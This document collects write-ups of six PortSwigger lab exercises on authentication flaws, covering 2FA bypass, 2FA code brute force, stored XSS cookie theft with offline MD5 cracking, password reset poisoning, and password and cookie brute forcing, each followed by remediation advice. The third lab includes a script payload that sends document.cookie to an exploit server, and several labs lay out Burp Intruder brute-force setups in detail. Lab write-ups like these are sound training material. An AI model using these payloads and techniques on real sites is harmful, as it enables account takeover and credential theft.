#  2FA Simple Bypass (Forced Browsing)

##  Lab Description
This lab enforces Two-Factor Authentication (2FA) after the initial login. However, the application logic is flawed. It creates the user session immediately after the first login step (username/password) but fails to validate the 2FA completion on subsequent page requests.

##  Objective
Log in to the victim's account (`carlos`) by bypassing the 2FA verification screen and accessing the account page directly.

## 🧠 The Vulnerability (Broken Logic Flow)
Authentication flows often have multiple steps: `Login -> 2FA -> Dashboard`.
* **The Flaw:** The server establishes the authenticated session **before** the 2FA step is completed. It assumes the user will dutifully enter the code.
* **The Exploit:** The attacker (who knows the password but not the 2FA code) simply manually changes the URL to a protected page (like `/my-account`), skipping the 2FA check entirely. This is known as **Forced Browsing**.



##  Steps to Reproduce

1.  **Initial Login:**
    * Log in using the victim's credentials (`carlos`:`montoya`).
    * The application redirects you to the 2FA verification page (`/login2`).

2.  **Analyze the State:**
    * At this point, you are stuck because you don't have the 4-digit code.
    * Observe the URL: `https://YOUR-LAB-ID.../login2`.

3.  **Execute the Bypass:**
    * Manually change the URL in the browser's address bar to a protected endpoint, such as:
        `https://YOUR-LAB-ID.../my-account`
    * Press **Enter**.

4.  **Verify Access:**
    * The application loads the "My Account" page instead of redirecting you back to the 2FA screen.
    * This confirms the 2FA check was bypassed, and the lab is solved.

##  Remediation
* **Session Management:** Do not fully establish a privileged session until **all** authentication steps (including 2FA) are successfully completed.
* **Middleware Checks:** Implement a check on every protected route to ensure the user has the `2fa_completed` flag set to true.

# 2nd lab

#  Lab: 2FA Broken Logic (PortSwigger)
**Goal:** Bypass 2FA to access Carlos's account.
**Vulnerability:** Business Logic Flaw + No Rate Limiting.

##  Methodology

### Step 1: Analyze the Flow
1. Log in with valid credentials (`wiener:peter`).
2. Observe the 2FA page. The server sets a cookie: `verify=wiener`.

### Step 2: Trigger Code Generation for Victim (CRITICAL STEP)
1. Capture the `GET /login2` request (the page load request).
2. Send it to **Repeater**.
3. Change the cookie to `verify=carlos`.
4. Send request.
   * *Logic:* This forces the server to generate a 4-digit code for Carlos internally.

### Step 3: Brute Force the Code
1. Attempt a login with a random code (e.g., `1234`).
2. Capture the `POST /login2` request.
3. Send to **Turbo Intruder** (or Intruder).
4. **Modifications:**
   * Change Cookie: `verify=carlos` (to match the victim).
   * Set Payload: `mfa-code=%s` (for injection).
5. **Payload Script:**
   * Range: `0000` to `9999`.
   * Format: `%04d` (to ensure 4 digits).

### Step 4: The Exploit
1. Run the attack.
2. Look for **Status 302** (Found/Redirect).
3. Right-click the request -> **Show response in browser**.
4. Access the URL to log in as Carlos.

---
**Key Takeaway:** Always ensure the server has generated a session/code for the victim before starting a brute-force attack.

## 3rd lab

#  Lab: Offline Password Cracking (PortSwigger)
**Goal:** Steal Carlos's 'stay-logged-in' cookie, crack his password offline, and delete his account.
**Vulnerabilities Chained:** Stored XSS + Insecure Credential Storage (Weak Cryptography).

##  Methodology & Steps

### Step 1: Reconnaissance (Understanding the Mechanism)
1. Log in with your own credentials (`wiener:peter`) and check the `stay-logged-in` box.
2. Intercept the request in Burp Suite and observe the `stay-logged-in` cookie.
3. Decode the cookie using Burp Decoder (**Base64**). 
4. **Observation:** The decoded format is `username:MD5_Hash_Of_Password`.

### Step 2: Payload Injection (Stored XSS)
1. Navigate to the Blog Comments section.
2. The comment input is vulnerable to Stored XSS. Inject a payload to steal the document cookie and send it to your Exploit Server.
   * **Payload used:** `<script>fetch('https://YOUR-EXPLOIT-SERVER/log?cookie=' + document.cookie);</script>`
3. Submit the comment.

### Step 3: Harvesting the Hash
1. Wait for the victim (Carlos) to view the comment page.
2. Check the Access Logs on your Exploit Server.
3. Locate the incoming request containing Carlos's cookie: `stay-logged-in=Y2FybG9zO...`
4. Copy the Base64 string.

### Step 4: Offline Cracking
1. Decode Carlos's Base64 cookie in Burp Decoder.
2. Extract the MD5 hash portion (e.g., `carlos:THE_HASH`).
3. Take the extracted hash and use an offline rainbow table service like **CrackStation.net** to crack the MD5 hash and reveal the plaintext password.

### Step 5: Exploit
1. Use the cracked plaintext password to log in as `carlos`.
2. Navigate to "My Account" and click **Delete Account** to solve the lab.

---
**Key Takeaway:** Never store sensitive data like password hashes in client-side cookies. If you must use a 'remember me' token, use a strong, randomly generated, un-guessable session token. Also, MD5 is deprecated and should never be used for password hashing.

# lab 4th

#  Lab: Password Reset Poisoning via Middleware (PortSwigger)
**Goal:** Take over Carlos's account by stealing his password reset token.
**Vulnerability:** Host Header Injection / Password Reset Poisoning.

##  The Concept
The server dynamically generates password reset links based on the `Host` or `X-Forwarded-Host` HTTP headers. By injecting an attacker-controlled domain into these headers, the server sends a poisoned reset link to the victim. When the victim clicks it, their secret reset token is leaked to the attacker's server.

##  Methodology & Steps

### Step 1: Recon & Setup
1. Get the URL of your Exploit Server (e.g., `exploit-XXXX.exploit-server.net`). Note: Do not include `https://`.

### Step 2: Intercept the Target Request
1. Go to the Lab's login page and click **"Forgot password?"**.
2. Enter the victim's username (`carlos`).
3. Turn Intercept ON in Burp Suite and click "Submit".
4. Send the intercepted `POST /forgot-password` request to **Repeater** (Ctrl+R) and turn Intercept OFF.

### Step 3: The Poisoning (Header Injection)
1. Go to Repeater.
2. Leave the original `Host:` header intact.
3. Add a new line below it and inject your Exploit Server domain using the `X-Forwarded-Host` header:
   `X-Forwarded-Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net`
4. Ensure the body of the request contains `username=carlos`.
5. Send the request. You should receive a `200 OK` response. 
   *(The server has now emailed the poisoned link to Carlos).*

### Step 4: Harvesting the Token
1. Go to your Exploit Server dashboard.
2. Click on **"Access log"**.
3. Look at the latest incoming requests at the bottom.
4. You will see a `GET` request from the victim clicking the poisoned link:
   `GET /forgot-password?temp-forgot-password-token=SECRET_TOKEN_HERE HTTP/1.1`
5. Copy the value of the `temp-forgot-password-token`.

### Step 5: Account Takeover
1. Go back to the original Lab website.
2. Manually construct the legitimate reset URL using the stolen token:
   `https://YOUR-LAB-ID.web-security-academy.net/forgot-password?temp-forgot-password-token=SECRET_TOKEN_HERE`
3. Hit Enter. You will be prompted to set a new password.
4. Set a new password (e.g., `hacked123`) and log in as `carlos`.

---
**Key Takeaway / Mitigation:** Never trust the `Host` or `X-Forwarded-Host` headers to generate sensitive URLs (like password reset links). Always use a securely configured, hardcoded base URL on the server-side.

# lab 5th

#  Lab: Password Brute-force via Password Change (PortSwigger)
**Goal:** Brute-force Carlos's password and log into his account.
**Vulnerability:** Flawed Logic / Incomplete Rate Limiting on the Password Change Endpoint.

##  The Concept
The application destroys the user's session if they submit the wrong `current-password` during a password change attempt, intending to prevent brute-forcing. 
However, if the user submits **mismatching** `new-password` values, the application evaluates the `current-password` first. If it's correct, it throws a "New passwords do not match" error. This specific code path bypasses the session-destruction mechanism, allowing unlimited brute-force attempts to guess the current password.

##  Methodology & Steps

### Step 1: Capture the Request
1. Log in with your valid credentials (`wiener:peter`).
2. Go to "My account" -> "Change Password".
3. Enter fake details and intercept the `POST /my-account/change-password` request in Burp Suite.
4. Send to **Intruder**.

### Step 2: Configure Intruder (The Mismatch Trick)
1. In the **Positions** tab, clear all default payload markers (`Clear §`).
2. Change the `username` parameter from your user to the victim: `username=carlos`.
3. Set the payload marker on the `current-password` parameter: `current-password=§peter§`.
4. **CRITICAL:** Set the new passwords to mismatch intentionally to bypass session destruction.
   Example: `new-password-1=123&new-password-2=abc`.
   
   *Final Payload String:*
   `username=carlos&current-password=§peter§&new-password-1=123&new-password-2=abc`

### Step 3: Brute-Force & Extract
1. In the **Payloads** tab, paste the list of candidate passwords.
2. In the **Settings (or Options)** tab under "Grep - Match", add the string: `New passwords do not match`.
3. Start the attack.
4. Look for the single request in the results table where the "New passwords do not match" column is ticked (✅). 
5. The payload used for that request is Carlos's actual password.

### Step 4: Exploit
1. Log out of your account.
2. Log in using `carlos` and the password you just discovered to solve the lab.

---
**Key Takeaway / Mitigation:** Rate limiting and brute-force protections must be applied consistently across all authentication-related endpoints, regardless of the input validation state (like mismatching passwords).


# LAB 6TH

#  Lab: Brute-forcing a stay-logged-in cookie (PortSwigger)
**Goal:** Reverse-engineer the cookie format and use Burp Intruder's Payload Processing to brute-force Carlos's session.
**Vulnerability:** Predictable/Insecure Session Token Generation (MD5 Hashing).

##  The Concept
The `stay-logged-in` cookie is generated using the following flawed format:
`Base64( username : MD5(password) )`
By using Burp Intruder's Payload Processing rules, we can automatically transform a plain text password list into correctly formatted, Base64-encoded cookies on the fly to brute-force a valid session.

##  Methodology & Steps

### Step 1: Request Interception
1. Attempt to access the `/my-account` endpoint while unauthenticated.
2. Send the resulting `GET /my-account` request to **Intruder**.

### Step 2: Set the Injection Point
1. In the **Positions** tab, clear all default markers.
2. Add a `stay-logged-in` cookie parameter and place the payload marker there:
   `Cookie: stay-logged-in=§§`

### Step 3: Payload Processing (The Core Exploit)
1. Go to the **Payloads** tab.
2. Paste your list of candidate passwords into the Simple List.
3. Under **Payload Processing**, add the following rules in this EXACT sequence:
   * **Rule 1:** `Hash` -> `MD5` (Hashes the plaintext password).
   * **Rule 2:** `Add prefix` -> `carlos:` (Prepends the victim's username).
   * **Rule 3:** `Encode` -> `Base64-encode` (Encodes the entire string to match the cookie format).
4. **Important:** Uncheck the "URL-encode these characters" box at the bottom of the tab so the Base64 padding (`=`) is not altered.

### Step 4: Execute and Analyze
1. Start the attack.
2. Monitor the HTTP Status Codes in the results table.
3. Invalid cookies will result in a `302 Found` (redirect to the login page).
4. The single request that returns a `200 OK` is the correct cookie. The plaintext payload listed for that request is the victim's password.

### Step 5: Takedown
1. Use the recovered plaintext password to log in as `carlos` and solve the lab.

---
**Key Takeaway / Mitigation:** Never use predictable components (like MD5 hashes of passwords) to generate session tokens. Always use strong, cryptographically secure random number generators (CSPRNG) to create opaque, unpredictable session IDs.